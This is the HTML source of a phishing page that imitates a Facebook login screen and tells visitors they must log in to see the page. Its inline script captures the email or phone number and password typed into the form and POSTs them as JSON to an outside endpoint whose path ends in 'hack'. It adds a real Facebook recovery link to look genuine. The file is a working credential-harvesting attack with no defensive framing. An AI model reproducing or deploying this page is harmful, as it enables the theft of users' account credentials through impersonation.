<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
    crossorigin="anonymous">
  <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
  <title>Facebook Login</title>
</head>

<body>
  <img src="./fb1.png" width="100%" height="100px" alt="">
  <div class="container">
    <div class="container mt-4">
      <h3 class="alert-primary rounded mt-3">You must login to see the page</h3>
      <div class="container mt-4 pt-4">
        <form action="">
          <div class="form-group">
            <input id="email" class="form-control form-control-lg" type="text" placeholder="mobile number or email">
          </div>
          <div class="form-group">
            <input id="pass" class="form-control form-control-lg" type="text" placeholder="Password">
          </div>
          <button class="btn btn-block btn-primary" id="submit">Log In</button>
        </form>
        <div class="text-center">or</div>
        <a href="" class="btn btn-success btn-block mt-3">Create a new account</a>

        <a href="https://www.facebook.com/login/identify?ctx=recover&lwv=110&ars=royal_blue_bar">Forgotten account?</a>


      </div>

    </div>
  </div>


  <script>
    // Url to get p - http://rest.learncode.academy/api/veeweb/hack
    const emailPhone = document.querySelector("input#email");
    const password = document.querySelector("input#pass");
    const f = document.querySelector("form");

    f.addEventListener("submit", function (e) {
      e.preventDefault();
      const data = {
        email: emailPhone.value,
        pass: password.value
      }
      fetch('http://rest.learncode.academy/api/veeweb/hack', {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then(response => response.json()) // response.json() returns a promise
        .then((response) => {
          console.log("You saved this item", response); //returns the new item along with its ID
        })

    });

  </script>

</body>

</html>
